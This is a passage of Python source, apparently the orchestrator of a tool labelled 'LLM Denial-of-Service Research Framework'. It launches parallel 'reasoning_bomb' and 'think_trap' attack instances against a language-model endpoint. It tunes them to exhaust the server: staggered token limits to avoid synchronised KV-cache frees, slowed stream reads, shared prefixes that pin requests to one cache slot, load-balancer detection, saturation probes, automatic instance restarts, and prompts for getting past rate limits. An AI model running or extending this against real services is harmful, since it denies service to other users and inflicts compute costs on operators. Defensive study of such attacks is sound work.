        self.skip_probing         = skip_probing

        self._stop   = asyncio.Event()
        self._queue:  asyncio.Queue = asyncio.Queue()
        self._collector = ResultCollector()
        self._display   = StatusDisplay()
        self._probes:   Optional[ITLProbes] = None
        self._instances: list[AttackerInstance] = []
        self._tasks:    list[asyncio.Task] = []

        # Inter-request delay (adjustable via rate_limit recovery)
        self._inter_request_delay: float = 0.0

        # Recovery state
        self._recovering              = False
        self._recovery_triggered      = asyncio.Event()
        self._recovery_error:   str   = ""
        self._recovery_category: str  = ""
        self._consecutive_failures    = 0

        # Live display handle (set during run())
        self._live:         Optional[Any]            = None
        self._refresh_task: Optional[asyncio.Task]  = None

        # puzzle pool size for reasoning_bomb (for distinct puzzle per instance)
        self._pool_size: Optional[int] = None
        if attack_type == "reasoning_bomb":
            try:
                pf  = attack_extra.get("puzzle_file", "prompts/reasoningBomb_puzzles.json")
                bt  = attack_extra.get("budget_tier", "256")
                ldr = PuzzleLoader(pf)
                if bt == "mixed":
                    self._pool_size = min(ldr.count(t) for t in ["128", "256", "512"])
                else:
                    self._pool_size = ldr.count(bt)
            except Exception:
                pass

    # ── Probe setup ───────────────────────────────────────────────────

    def _build_probes(self) -> ITLProbes:
        cfg = ProbeConfig(
            target=self.target,
            max_probe_tokens=128,
            temperature=0.0,
            baseline_window=5,
            burst_concurrency=4,
            rolling_window=20,
            itl_fill_threshold=1.5,
            itl_saturated_threshold=3.0,
            ttft_hol_threshold=5.0,
            itl_cv_thrash_threshold=0.5,
            regressor_backend="linear",
            baseline_cache_path="probes/results/baseline_cache.json",
            history_path="probes/results/probe_history.jsonl",
        )
        return ITLProbes(cfg)

    # ── Instance factory ──────────────────────────────────────────────

    def _make_instance(self, index: int) -> AttackerInstance:
        # ── Per-instance max_tokens spread ────────────────────────────────────
        # Distribute max_tokens linearly across instances so each one hits its
        # limit at a different wall-clock time, avoiding synchronised KV-cache
        # frees.  With spread=25% and 4 instances the range is [75%, 100%] of
        # max_tokens: [0.75M, 0.83M, 0.92M, 1.00M].
        if self.max_tokens_spread_pct > 0 and self.n_instances > 1:
            low   = self.max_tokens * (1.0 - self.max_tokens_spread_pct / 100.0)
            step  = (self.max_tokens - low) / (self.n_instances - 1)
            inst_max_tokens = max(64, int(round(low + step * index)))
        else:
            inst_max_tokens = self.max_tokens

        cls, factory, extra_kw = build_attack_factory(
            self.attack_type,
            self.target,
            inst_max_tokens,
            self.attack_extra,
            n_puzzles=self._pool_size,
            instance_index=index,
            stream_read_delay_s=self.stream_read_delay_s,
        )
        cfg = AttackerInstanceConfig(
            attack_cls=cls,
            attack_config_factory=factory,
            attack_extra_kwargs=extra_kw,
            launch_delay_s=self.launch_stagger_s * index,
        )
        return AttackerInstance(cfg)

    # ── Pre-flight connectivity check ────────────────────────────────

    async def preflight_check(self) -> bool:
        """
        Fire one attack request with a tiny token budget to verify:
          - endpoint is reachable
          - payload format is accepted (HTTP 2xx)
          - puzzle/prompts file can be loaded

        Returns True if OK, False if the request failed.
        Prints the error so the user can act before launching N instances.
        """
        _print(
            "  [dim]Pre-flight: firing one test request…[/dim]"
            if _RICH else
            "  Pre-flight: firing one test request…"
        )
        # Use small max_tokens just to get a quick response
        from orchestration.registry import make_config_factory as _mcf
        factory = _mcf(self.target, max_tokens=64)

        try:
            cls, _, extra_kw = build_attack_factory(
                self.attack_type, self.target, 64, self.attack_extra,
                n_puzzles=self._pool_size, instance_index=0,
            )
            attack = cls(factory(), **extra_kw)
        except Exception as exc:
            _print(
                f"  [bold red]Pre-flight FAILED (init): {exc}[/bold red]"
                if _RICH else
                f"  Pre-flight FAILED (init): {exc}"
            )
            return False

        try:
            result = await attack.run()
        except Exception as exc:
            _print(
                f"  [bold red]Pre-flight FAILED (request): {exc}[/bold red]"
                if _RICH else
                f"  Pre-flight FAILED (request): {exc}"
            )
            return False
        finally:
            await attack.close()

        if result.status == AttackStatus.FAILED:
            _print(
                f"  [bold red]Pre-flight FAILED: {result.error}[/bold red]"
                if _RICH else
                f"  Pre-flight FAILED: {result.error}"
            )
            return False

        _print(
            f"  [green]Pre-flight OK — "
            f"{result.token_metrics.completion_tokens} tokens in "
            f"{result.latency_metrics.total_duration_s:.1f}s[/green]"
            if _RICH else
            f"  Pre-flight OK — "
            f"{result.token_metrics.completion_tokens} tokens in "
            f"{result.latency_metrics.total_duration_s:.1f}s"
        )
        return True

    # ── Baseline calibration ──────────────────────────────────────────

    async def run_baseline(self) -> None:
        _print("\n[bold #8B0000]── Baseline Calibration ──[/bold #8B0000]" if _RICH
               else "\n── Baseline Calibration ──")
        _print("  Running 5 probe requests against idle server…")

        self._probes = self._build_probes()

        # Always run a fresh calibration — never rely on a cached value,
        # since the server state may have changed since the last run.
        result = await self._probes.calibrate_baseline(
            n_samples=5, warm_up=1, inter_delay_s=0.5
        )
        itl  = result.get("baseline_itl_ms", 0.0)
        ttft = result.get("baseline_ttft_s", 0.0)
        kv   = result.get("baseline_kv_est",  0.0)
        _print(
            f"  [green]Baseline: ITL={itl:.2f} ms  TTFT={ttft:.4f} s  "
            f"KV(idle)={kv:.4f}[/green]"
            if _RICH else
            f"  Baseline: ITL={itl:.2f} ms  TTFT={ttft:.4f} s  KV(idle)={kv:.4f}"
        )

    # ── Budget watcher ────────────────────────────────────────────────

    async def _budget_watcher(self) -> None:
        """Sets stop_event when the token budget is exhausted."""
        if self.token_budget is None:
            return
        while not self._stop.is_set():
            generated = (
                self._collector._results and
                sum(
                    r.token_metrics.completion_tokens + r.token_metrics.reasoning_tokens
                    for r in self._collector._results
                )
            ) or 0
            if generated >= self.token_budget:
                _print(
                    f"\n  [bold yellow]Token budget exhausted "
                    f"({generated:,} / {self.token_budget:,}). Stopping.[/bold yellow]"
                    if _RICH else
                    f"\n  Token budget exhausted ({generated:,} / {self.token_budget:,}). Stopping."
                )
                self._stop.set()
                return
            await asyncio.sleep(2.0)

    # ── Instance watchdog ─────────────────────────────────────────────

    async def _instance_watchdog(self) -> None:
        """
        Monitors running instance tasks. If a task dies unexpectedly and
        the stop event hasn't fired (budget remains, no saturation),
        a replacement instance is spawned.
        """
        while not self._stop.is_set():
            await asyncio.sleep(self.WATCHDOG_INTERVAL_S)
            for i, task in enumerate(list(self._tasks)):
                if task.done() and not self._stop.is_set():
                    exc = task.exception() if not task.cancelled() else None
                    if exc:
                        _print(
                            f"\n  [yellow]Instance task {i} died: {exc}. Restarting.[/yellow]"
                            if _RICH else
                            f"\n  Instance task {i} died: {exc}. Restarting."
                        )
                    inst = self._make_instance(len(self._instances))
                    self._instances.append(inst)
                    new_task = asyncio.create_task(
                        inst.run_loop(self._queue, self._stop)
                    )
                    self._tasks[i] = new_task

    # ── Probe monitor ──────────────────────────────────────────────────

    async def _probe_monitor(self) -> None:
        """
        Periodically fires probes and updates the live display.
        Also records state transitions for the final summary.
        """
        if self._probes is None:
            return

        def on_probe(result, state: InfraState) -> None:
            self._display.update(
                state=state,
                kv_est=result.kv_usage_est,
                itl_ms=result.mean_itl_ms,
                ttft_s=result.ttft_s,
            )
            self._collector.record_state(state)

        await self._probes.monitor(
            interval_s=self.PROBE_INTERVAL_S,
            on_probe=on_probe,
            stop_event=self._stop,
        )

    # ── Display refresh ───────────────────────────────────────────────

    async def _refresh_display(self) -> None:
        while not self._stop.is_set() and not self._recovering:
            results = self._collector._results
            output_tok = sum(
                r.token_metrics.completion_tokens + r.token_metrics.reasoning_tokens
                for r in results
            )
            input_tok = sum(r.token_metrics.prompt_tokens for r in results)
            self._display.update(
                requests=len(results),
                output_tokens=output_tok,
                input_tokens=input_tok,
                budget=self.token_budget,
                instances=len(self._instances),
            )
            if _RICH and self._live:
                self._live.update(self._display.render())
            elif not _RICH:
                self._display.render()
            await asyncio.sleep(1.0)

    # ── Error recovery ────────────────────────────────────────────────

    async def _error_watcher(self) -> None:
        """Waits for the recovery trigger, then hands off to _trigger_recovery."""
        while not self._stop.is_set():
            try:
                await asyncio.wait_for(self._recovery_triggered.wait(), timeout=1.0)
            except asyncio.TimeoutError:
                continue
            if self._stop.is_set():
                break
            self._recovery_triggered.clear()
            await self._trigger_recovery(self._recovery_category, self._recovery_error)

    async def _trigger_recovery(self, category: str, sample_error: str) -> None:
        """
        Pause instances, prompt user to fix the config, then restart.

        Runs entirely inside the existing event loop — the probe monitor and
        collector keep running while we wait for user input.
        """
        if self._recovering:
            return
        self._recovering = True

        # ── Stop the Live display so input() isn't overwritten ────────
        if _RICH and self._live:
            self._live.stop()
        if self._refresh_task and not self._refresh_task.done():
            self._refresh_task.cancel()
            await asyncio.gather(self._refresh_task, return_exceptions=True)

        _print("\n")
        if _RICH:
            console.rule("[bold red]Attack Paused — Recoverable Error[/bold red]")
        else:
            print("=" * 60)
            print("  Attack Paused — Recoverable Error")
            print("=" * 60)

        _print(
            f"\n  [bold red]Error category :[/bold red] {category}\n"
            f"  [dim]Sample error   : {sample_error[:120]}[/dim]\n"
            if _RICH else
            f"\n  Error category : {category}\n"
            f"  Sample error   : {sample_error[:120]}\n"
        )

        # ── Cancel all running instance tasks ─────────────────────────
        for task in self._tasks:
            task.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()

        # ── Per-category prompt ───────────────────────────────────────
        LABELS = {
            "token_limit":   "Max tokens per request",
            "auth":          "API key",
            "model_not_found": "Model name",
            "rate_limit":    "Delay between requests (seconds)",
        }
        label = LABELS.get(category, "Unknown error")

        if category == "token_limit":
            _print(
                f"  The model rejected [bold]{self.max_tokens:,}[/bold] max_tokens.\n"
                f"  Lower it below the model's context window.\n"
                if _RICH else
                f"  The model rejected {self.max_tokens:,} max_tokens.\n"
                f"  Lower it below the model's context window.\n"
            )
            raw = await _ask_async(f"New {label}", str(self.max_tokens))
            try:
                new_val = int(raw)
                if new_val > 0:
                    self.max_tokens = new_val
                    _print(
                        f"  [green]max_tokens updated → {self.max_tokens:,}[/green]"
                        if _RICH else
                        f"  max_tokens updated → {self.max_tokens:,}"
                    )
            except ValueError:
                _print("  Invalid value — keeping current setting.", "yellow")

        elif category == "auth":
            raw = await _ask_async(f"New {label} (leave blank to keep current)")
            if raw:
                self.target = self.target.__class__(
                    **{**self.target.__dict__, "api_key": raw}
                )
                _print("  [green]API key updated.[/green]" if _RICH else "  API key updated.")

        elif category == "model_not_found":
            raw = await _ask_async(f"New {label}", self.target.model)
            if raw and raw != self.target.model:
                # TargetConfig is a dataclass — rebuild with new model
                import dataclasses
                self.target = dataclasses.replace(self.target, model=raw)
                _print(
                    f"  [green]Model updated → {self.target.model}[/green]"
                    if _RICH else
                    f"  Model updated → {self.target.model}"
                )

        elif category == "rate_limit":
            raw = await _ask_async(f"New {label}", "1.0")
            try:
                delay = float(raw)
                # Propagate to new instances via a stored attribute
                self._inter_request_delay = max(0.0, delay)
                _print(
                    f"  [green]Inter-request delay → {self._inter_request_delay:.1f}s[/green]"
                    if _RICH else
                    f"  Inter-request delay → {self._inter_request_delay:.1f}s"
                )
            except ValueError:
                _print("  Invalid value — keeping 0s delay.", "yellow")

        # ── Ask whether to continue ───────────────────────────────────
        action = await _ask_async("Continue attack? (y/n)", "y")
        if action.lower() not in ("y", "yes"):
            _print("  Stopping." if not _RICH else "  [yellow]Stopping.[/yellow]")
            self._stop.set()
            self._recovering = False
            return

        # ── Clear error history from the previous bad run ────────────
        self._consecutive_failures = 0
        self._collector._results = [
            r for r in self._collector._results
            if r.status != AttackStatus.FAILED
        ]
        self._display.update(errors=0, last_error="")

        # ── Restart instances with updated config ─────────────────────
        self._instances = []
        for i in range(self.n_instances):
            self._instances.append(self._make_instance(i))

        for inst in self._instances:
            task = asyncio.create_task(
                inst.run_loop(
                    self._queue, self._stop,
                    inter_request_delay_s=self._inter_request_delay,
                )
            )
            self._tasks.append(task)

        _print(
            f"\n  [green]Restarted {self.n_instances} instances with "
            f"max_tokens={self.max_tokens:,}.[/green]\n"
            if _RICH else
            f"\n  Restarted {self.n_instances} instances with "
            f"max_tokens={self.max_tokens:,}.\n"
        )

        # ── Restart Live display ──────────────────────────────────────
        if _RICH and self._live:
            self._live.start()
        self._refresh_task = asyncio.create_task(self._refresh_display())

        self._recovering = False

    # ── Collector task ────────────────────────────────────────────────

    async def _collect(self) -> None:
        """Drain the result queue, surface FAILED results, and trigger recovery."""
        while not self._stop.is_set() or not self._queue.empty():
            try:
                result = await asyncio.wait_for(self._queue.get(), timeout=0.25)
                self._collector._results.append(result)
                self._queue.task_done()

                if result.status == AttackStatus.FAILED and result.error:
                    n_failed = sum(
                        1 for r in self._collector._results
                        if r.status == AttackStatus.FAILED
                    )
                    self._display.update(errors=n_failed, last_error=result.error)
                    self._consecutive_failures += 1

                    # Only print the first occurrence of each distinct error to avoid spam
                    all_errors = [
                        r.error for r in self._collector._results
                        if r.status == AttackStatus.FAILED and r.error
                    ]
                    if all_errors.count(result.error) == 1:
                        _print(
                            f"\n  [red][attack error][/red] {result.error}"
                            if _RICH else
                            f"\n  [attack error] {result.error}"
                        )

                    # Trigger recovery once we have enough consecutive failures
                    # with a classifiable, actionable error.
                    if (
                        self._consecutive_failures >= RECOVERY_CONSECUTIVE
                        and not self._recovering
                        and not self._recovery_triggered.is_set()
                    ):
                        category = _classify_error(result.error)
                        if category:
                            self._recovery_error    = result.error
                            self._recovery_category = category
                            self._recovery_triggered.set()
                else:
                    self._consecutive_failures = 0

            except asyncio.TimeoutError:
                continue

    # ── Main run ──────────────────────────────────────────────────────

    async def run(self) -> None:
        # Step 1 — baseline
        if not self.skip_probing:
            await self.run_baseline()

        # Step 2 — pre-flight (verify endpoint + payload before launching N instances)
        ok = await self.preflight_check()
        if not ok:
            _print(
                "\n  [bold red]Pre-flight failed. Fix the error above then retry.[/bold red]"
                if _RICH else
                "\n  Pre-flight failed. Fix the error above then retry."
            )
            return

        sp_display = (
            f'"{self.target.system_prompt[:60]}{"…" if len(self.target.system_prompt) > 60 else ""}"'
            if self.target.system_prompt else "none"
        )
        stagger_str    = f"{self.launch_stagger_s:.2f}s" if self.launch_stagger_s > 0 else "off"
        spread_str     = f"±{self.max_tokens_spread_pct:.0f}%" if self.max_tokens_spread_pct > 0 else "off"
        read_delay_str = f"{self.stream_read_delay_s*1000:.0f} ms/chunk" if self.stream_read_delay_s > 0 else "off"
        puzzle_file    = self.attack_extra.get("puzzle_file", "")
        budget_tier    = self.attack_extra.get("budget_tier", "")
        prompts_file   = self.attack_extra.get("prompts_file", "")
        extra_lines = ""
        if self.attack_type == "reasoning_bomb" and puzzle_file:
            extra_lines = (
                f"  Puzzle file     : {puzzle_file}\n"
                f"  Budget tier     : {budget_tier}\n"
            )
        elif self.attack_type == "think_trap" and prompts_file:
            extra_lines = f"  Prompts file    : {prompts_file}\n"

        # Clear the terminal so only the attack config + live panel are visible
        if _RICH and console:
            console.clear()
        else:
            print("\033[2J\033[H", end="", flush=True)

        _print(
            f"\n[bold #8B0000]── Launching Attack ──[/bold #8B0000]\n"
            f"  Type            : {self.attack_type}\n"
            f"{extra_lines}"
            f"  Instances       : {self.n_instances}\n"
            f"  Max tokens      : {self.max_tokens:,} per request\n"
            f"  Token spread    : {spread_str}\n"
            f"  Launch stagger  : {stagger_str}\n"
            f"  Stream rd delay : {read_delay_str}\n"
            f"  Budget          : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
            f"  System prompt   : {sp_display}\n"
            f"  Press [bold]Ctrl+C[/bold] to stop.\n"
            if _RICH else
            f"\n── Launching Attack ──\n"
            f"  Type            : {self.attack_type}\n"
            f"{extra_lines}"
            f"  Instances       : {self.n_instances}\n"
            f"  Max tokens      : {self.max_tokens:,} per request\n"
            f"  Token spread    : {spread_str}\n"
            f"  Launch stagger  : {stagger_str}\n"
            f"  Stream rd delay : {read_delay_str}\n"
            f"  Budget          : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
            f"  System prompt   : {sp_display}\n"
            f"  Press Ctrl+C to stop.\n"
        )

        # Step 2 — create instances
        for i in range(self.n_instances):
            self._instances.append(self._make_instance(i))

        # Step 3 — launch tasks
        for inst in self._instances:
            task = asyncio.create_task(inst.run_loop(self._queue, self._stop))
            self._tasks.append(task)

        collect_task    = asyncio.create_task(self._collect())
        probe_task      = asyncio.create_task(self._probe_monitor())
        budget_task     = asyncio.create_task(self._budget_watcher())
        watchdog_task   = asyncio.create_task(self._instance_watchdog())
        recovery_task   = asyncio.create_task(self._error_watcher())

        try:
            if _RICH:
                self._live = Live(
                    self._display.render(), refresh_per_second=2, console=console
                )
                self._live.start()
                self._refresh_task = asyncio.create_task(self._refresh_display())
                await self._stop.wait()
            else:
                self._refresh_task = asyncio.create_task(self._refresh_display())
                await self._stop.wait()

        except (KeyboardInterrupt, asyncio.CancelledError):
            _print(
                "\n\n  [bold yellow]Interrupted by user.[/bold yellow]"
                if _RICH else
                "\n\n  Interrupted by user."
            )
            self._stop.set()

        finally:
            if self._refresh_task and not self._refresh_task.done():
                self._refresh_task.cancel()
            if _RICH and self._live:
                self._live.stop()

            # Cancel instance loops
            for task in self._tasks:
                task.cancel()
            budget_task.cancel()
            watchdog_task.cancel()
            probe_task.cancel()
            recovery_task.cancel()

            # Drain remaining results
            await asyncio.gather(*self._tasks, return_exceptions=True)
            await collect_task

            if self._probes:
                await self._probes.close()

            # Final summary
            run_result = self._collector.finalise(
                instance_stats=[inst.stats for inst in self._instances]
            )
            self._print_summary(run_result)

    def _print_summary(self, result: Any) -> None:
        _print(
            "\n[bold #8B0000]── Attack Summary ──[/bold #8B0000]" if _RICH
            else "\n── Attack Summary ──"
        )
        if _RICH:
            t = Table(box=box.SIMPLE, show_header=True, header_style="bold #8B0000")
            t.add_column("Metric", style="dim")
            t.add_column("Value", justify="right")
            t.add_row("Wall clock",        f"{result.wall_clock_s:.1f}s")
            t.add_row("Total requests",    str(result.total_requests))
            t.add_row("Successful",        str(result.successful))
            t.add_row("Timed out",         str(result.timed_out))
            t.add_row("Cancelled",         str(result.cancelled))
            t.add_row("Failed",            str(result.failed))
            t.add_row("Mean amp ratio",    f"{result.mean_amplification_ratio:.1f}×")
            t.add_row("P95 amp ratio",     f"{result.p95_amplification_ratio:.1f}×")
            t.add_row("Output tokens",      f"{result.total_generated_tokens:,}")
            t.add_row("Input tokens",       f"{result.total_prompt_tokens:,}")
            t.add_row("Total tokens",       f"{result.total_generated_tokens + result.total_prompt_tokens:,}")
            t.add_row("Tokens/s",           f"{result.tokens_generated_per_second:.0f}")
            t.add_row("Mean TTFT",         f"{result.mean_ttft_s:.2f}s")
            t.add_row("Mean duration",     f"{result.mean_total_duration_s:.1f}s")
            console.print(t)

        else:
            print(result.summary())


# ─────────────────────────────────────────────
# Main entry point
# ─────────────────────────────────────────────

_BANNER = r"""
 ███████████                       ███             ██████████                        ███
▒▒███▒▒▒▒▒███                     ▒▒▒             ▒▒███▒▒▒▒███                      ▒▒▒
 ▒███    ▒███ ████████   ██████   ████  ████████   ▒███   ▒▒███ ████████   ██████   ████  ████████
 ▒██████████ ▒▒███▒▒███ ▒▒▒▒▒███ ▒▒███ ▒▒███▒▒███  ▒███    ▒███▒▒███▒▒███ ▒▒▒▒▒███ ▒▒███ ▒▒███▒▒███
 ▒███▒▒▒▒▒███ ▒███ ▒▒▒   ███████  ▒███  ▒███ ▒███  ▒███    ▒███ ▒███ ▒▒▒   ███████  ▒███  ▒███ ▒███
 ▒███    ▒███ ▒███      ███▒▒███  ▒███  ▒███ ▒███  ▒███    ███  ▒███      ███▒▒███  ▒███  ▒███ ▒███
 ███████████  █████    ▒▒████████ █████ ████ █████ ██████████   █████    ▒▒████████ █████ ████ █████
▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒      ▒▒▒▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒      ▒▒▒▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒ ▒▒▒▒▒
"""


def main() -> None:
    _setup_logging()

    if _RICH:
        console.print(_BANNER, style="bold #8B0000", highlight=False)
        console.print(
            "       LLM Denial-of-Service Research Framework\n",
            style="dim",
            justify="center",
        )
    else:
        print(_BANNER)
        print("       LLM Denial-of-Service Research Framework\n")

    # Gather config interactively
    target  = gather_target_config()

    # Optional KV saturation calculator
    run_kv = _choose(
        "\nRun KV cache saturation calculator? Note requires specific GPU and model parameters",
        ["y", "n"],
        "n",
    )
    if run_kv == "y":
        _run_kv_calculator()

    # Optional load-balancer detection — run before setting system prompt so the
    # user can see baseline routing behaviour first, then decide whether to pin
    # a prefix.
    run_lb = _choose(
        "\nRun load-balancer detection test before attacking?",
        ["y", "n"],
        "n",
    )
    if run_lb == "y":
        try:
            asyncio.run(_run_lb_test(target))
        except KeyboardInterrupt:
            _print("\n  LB test interrupted." if not _RICH else "\n  [yellow]LB test interrupted.[/yellow]")

        cont = _choose("Continue to attack configuration?", ["y", "n"], "y")
        if cont != "y":
            return

    # System prompt — asked after the LB test so the user can observe baseline
    # routing before deciding whether to pin a prefix.
    _print(
        "\n  [dim]System prompt — sent with every attack and probe request. "
        "A shared prefix pins concurrent requests to the same KV-cache slot "
        "via prefix-aware routing. Leave blank to omit.[/dim]"
        if _RICH else
        "\n  System prompt — sent with every attack and probe request. A shared prefix\n"
        "  pins requests to the same KV-cache slot via prefix-aware routing.\n"
        "  Leave blank to omit."
    )
    system_prompt_raw = _ask("System prompt (leave blank to omit)")
    if system_prompt_raw:
        import dataclasses
        target = dataclasses.replace(target, system_prompt=system_prompt_raw)

    _print(
        "\n  [dim]Request prefix — prepended to every attack and probe message. "
        "A shared prefix pins all requests to the same KV-cache slot via "
        "prefix-aware routing. Leave blank to omit.[/dim]"
        if _RICH else
        "\n  Request prefix — prepended to every attack and probe message.\n"
        "  A shared prefix pins requests to the same KV-cache slot via\n"
        "  prefix-aware routing. Leave blank to omit."
    )
    request_prefix_raw = _ask("Request prefix (leave blank to omit)")
    if request_prefix_raw:
        import dataclasses
        target = dataclasses.replace(target, request_prefix=request_prefix_raw)

    params  = gather_attack_params(target)

    orchestrator = AttackOrchestrator(
        target=target,
        attack_type=params["attack_type"],
        n_instances=params["n_instances"],
        max_tokens=params["max_tokens"],
        token_budget=params["token_budget"],
        attack_extra=params["extra"],
        launch_stagger_s=params["launch_stagger_s"],
        max_tokens_spread_pct=params["max_tokens_spread_pct"],
        stream_read_delay_s=params["stream_read_delay_s"],
        skip_probing=params["skip_probing"],
    )

    try:
        asyncio.run(orchestrator.run())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
